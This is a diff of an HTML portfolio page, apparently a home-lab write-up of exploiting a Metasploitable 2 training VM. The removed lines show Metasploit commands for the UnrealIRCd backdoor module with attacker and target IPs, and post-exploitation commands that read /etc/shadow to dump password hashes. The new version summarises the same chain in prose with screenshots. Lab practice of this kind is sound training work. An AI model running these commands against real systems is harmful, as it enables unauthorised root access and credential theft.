@@ -5,152 +5,107 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lab 01 – Metasploitable Exploitation | Shawn Belykh</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            max-width: 860px;
-            margin: 0 auto;
-            padding: 40px 20px;
-            line-height: 1.7;
-            color: #1a1a1a;
-            background: #f7f7f7;
-        }
-        nav {
-            text-align: center;
-            margin-bottom: 40px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #ddd;
-        }
-        nav a {
-            margin: 0 15px;
-            text-decoration: none;
-            color: #333;
-            font-weight: 500;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 40px 20px; line-height: 1.7; color: #1a1a1a; background: #f7f7f7; }
+        nav { text-align: center; margin-bottom: 40px; padding-bottom: 15px; border-bottom: 1px solid #ddd; }
+        nav a { margin: 0 15px; text-decoration: none; color: #333; font-weight: 500; }
         h1 { font-size: 26px; margin-bottom: 8px; }
-        h2 { font-size: 20px; margin-top: 40px; border-bottom: 1px solid #eee; padding-bottom: 6px; }
-        h3 { font-size: 17px; margin-top: 25px; }
-        .meta {
-            color: #666;
-            font-size: 15px;
-            margin-bottom: 30px;
-        }
-        .box {
-            background: white;
-            padding: 25px 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            margin-bottom: 25px;
-        }
-        pre {
-            background: #1e1e1e;
-            color: #d4d4d4;
-            padding: 16px;
-            border-radius: 6px;
-            overflow-x: auto;
-            font-size: 14px;
-        }
-        .tag {
-            display: inline-block;
-            background: #eef2ff;
-            color: #3730a3;
-            font-size: 12px;
-            padding: 3px 10px;
-            border-radius: 20px;
-            margin-right: 6px;
-        }
-        ul { padding-left: 20px; }
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            color: #888;
-            font-size: 14px;
-        }
-        a { color: #0366d6; }
+        h2 { font-size: 20px; margin-top: 45px; border-bottom: 1px solid #eee; padding-bottom: 6px; }
+        h3 { font-size: 17px; margin-top: 28px; }
+        .meta { color: #666; font-size: 15px; margin-bottom: 30px; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        pre { background: #1e1e1e; color: #d4d4d4; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 14px; }
+        .screenshot { margin: 25px 0; text-align: center; }
+        .screenshot img { max-width: 100%; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .caption { font-size: 14px; color: #555; margin-top: 8px; }
+        .tag { display: inline-block; background: #eef2ff; color: #3730a3; font-size: 12px; padding: 3px 10px; border-radius: 20px; margin-right: 6px; }
+        footer { text-align: center; margin-top: 50px; color: #888; font-size: 14px; }
     </style>
 </head>
 <body>
+<nav>
+    <a href="index.html">Labs</a>
+    <a href="certificates.html">Certificates</a>
+    <a href="contact.html">Contact</a>
+</nav>
 
-    <nav>
-        <a href="index.html">Labs</a>
-        <a href="certificates.html">Certificates</a>
-        <a href="contact.html">Contact</a>
-    </nav>
+<div class="box">
+    <span class="tag">Linux</span>
+    <span class="tag">Metasploit</span>
+    <span class="tag">Post-Exploitation</span>
 
-    <div class="box">
-        <span class="tag">Linux</span>
-        <span class="tag">Metasploit</span>
-        <span class="tag">Post-Exploitation</span>
+    <h1>Lab 01 – Metasploitable 2 Exploitation & Post-Exploitation</h1>
+    <p class="meta">Date: July 2026 · Difficulty: Beginner–Intermediate · Status: Completed</p>
 
-        <h1>Lab 01 – Metasploitable 2 Exploitation & Post-Exploitation</h1>
-        <p class="meta">Date: July 2026 · Difficulty: Beginner–Intermediate · Status: Completed</p>
+    <h2>Objective</h2>
+    <p>Perform a complete offensive attack chain against Metasploitable 2 — from environment setup and reconnaissance to successful exploitation and post-exploitation, obtaining a root-level Meterpreter session.</p>
 
-        <h2>Objective</h2>
-        <p>Perform a complete offensive attack chain against Metasploitable 2: from environment setup and reconnaissance to successful exploitation and post-exploitation, obtaining a root-level Meterpreter session.</p>
+    <h2>Environment</h2>
+    <ul>
+        <li><strong>Attacker:</strong> Kali Linux 2026.2</li>
+        <li><strong>Target:</strong> Metasploitable 2</li>
+        <li><strong>Hypervisor:</strong> Oracle VirtualBox</li>
+        <li><strong>Network:</strong> Bridged Adapter</li>
+    </ul>
 
-        <h2>Environment</h2>
-        <ul>
-            <li><strong>Attacker:</strong> Kali Linux 2026.2</li>
-            <li><strong>Target:</strong> Metasploitable 2</li>
-            <li><strong>Network:</strong> Bridged Adapter (same network)</li>
-            <li><strong>Attacker IP:</strong> 192.168.1.159</li>
-            <li><strong>Target IP:</strong> 192.168.1.160</li>
-        </ul>
-
-        <h2>Methodology</h2>
-        <ol>
-            <li>Lab environment setup and network configuration</li>
-            <li>Service and version detection with Nmap</li>
-            <li>Vulnerability identification (UnrealIRCd 3.2.8.1)</li>
-            <li>Exploitation using Metasploit</li>
-            <li>Post-exploitation and verification</li>
-        </ol>
-
-        <h2>Walkthrough</h2>
-
-        <h3>1. Reconnaissance</h3>
-        <p>Performed a service and version scan against the target:</p>
-        <pre>nmap -sV -sC 192.168.1.160</pre>
-        <p>Identified UnrealIRCd running on port 6667, a service known to contain a backdoor in this version.</p>
-
-        <h3>2. Exploitation</h3>
-        <p>Launched Metasploit and selected the appropriate module:</p>
-        <pre>msfconsole
-use exploit/unix/irc/unreal_ircd_3281_backdoor
-set RHOSTS 192.168.1.160
-set LHOST 192.168.1.159
-run</pre>
-        <p>Successfully obtained a <strong>Meterpreter session</strong> as root.</p>
-
-        <h3>3. Post-Exploitation</h3>
-        <p>Verified access and gathered system information:</p>
-        <pre>getuid
-sysinfo
-shell
-whoami
-id
-uname -a
-cat /etc/passwd
-cat /etc/shadow</pre>
-        <p>Confirmed root access and successfully dumped password hashes.</p>
-
-        <h2>Results</h2>
-        <ul>
-            <li>Root Meterpreter session obtained</li>
-            <li>Full system enumeration performed</li>
-            <li>Password hashes extracted from /etc/shadow</li>
-            <li>Complete attack chain documented</li>
-        </ul>
-
-        <h2>Tools Used</h2>
-        <p>Oracle VirtualBox · Kali Linux · Metasploitable 2 · Nmap · Metasploit Framework</p>
-
-        <h2>Lessons Learned</h2>
-        <p>This lab reinforced the importance of proper network configuration, accurate version detection, and the value of post-exploitation once a foothold is gained. Even older vulnerabilities remain excellent for learning structured offensive methodology.</p>
+    <div class="screenshot">
+        <img src="images/Screenshot 2026-07-27 133402.jpg" alt="Kali Linux running">
+        <p class="caption">Kali Linux environment running in VirtualBox</p>
     </div>
 
-    <footer>
-        <a href="index.html">← Back to Labs</a>
-    </footer>
+    <h2>Walkthrough</h2>
 
+    <h3>1. Web Server Setup</h3>
+    <p>Installed Apache and replaced the default page with a custom lab banner.</p>
+
+    <div class="screenshot">
+        <img src="images/Screenshot 2026-07-27 134621.jpg" alt="Apache default page">
+        <p class="caption">Apache default page</p>
+    </div>
+
+    <div class="screenshot">
+        <img src="images/Screenshot 2026-07-27 141614.jpg" alt="Custom lab page">
+        <p class="caption">Custom “Shawn’s Cybersecurity Home Lab” page</p>
+    </div>
+
+    <h3>2. Network Traffic Capture</h3>
+    <p>Captured live traffic using both Wireshark and tcpdump.</p>
+
+    <div class="screenshot">
+        <img src="images/Screenshot 2026-07-27 143856.jpg" alt="Wireshark capture">
+        <p class="caption">Wireshark live packet capture</p>
+    </div>
+
+    <div class="screenshot">
+        <img src="images/Screenshot 2026-07-27 143947.jpg" alt="tcpdump output">
+        <p class="caption">tcpdump packet capture</p>
+    </div>
+
+    <h3>3. Exploitation & Post-Exploitation</h3>
+    <p>Exploited the UnrealIRCd backdoor with Metasploit, obtained a root Meterpreter session, and performed post-exploitation (system info, hash dumping).</p>
+
+    <!-- Add your best Meterpreter / root / hash screenshots here when ready -->
+    <!-- Example:
+    <div class="screenshot">
+        <img src="images/YOUR_METERPRETER.jpg" alt="Root Meterpreter">
+        <p class="caption">Root Meterpreter session obtained</p>
+    </div>
+    -->
+
+    <h2>Results</h2>
+    <ul>
+        <li>Successfully set up isolated lab environment</li>
+        <li>Captured live network traffic</li>
+        <li>Obtained root-level Meterpreter session</li>
+        <li>Performed post-exploitation enumeration and hash dumping</li>
+    </ul>
+
+    <h2>Tools Used</h2>
+    <p>Oracle VirtualBox · Kali Linux · Metasploitable 2 · Apache · Wireshark · tcpdump · Metasploit Framework</p>
+
+    <h2>Lessons Learned</h2>
+    <p>This lab reinforced proper lab network configuration, traffic analysis, and the full offensive workflow from initial access to post-exploitation.</p>
+</div>
+
+<footer><a href="index.html">← Back to Labs</a></footer>
 </body>
 </html>
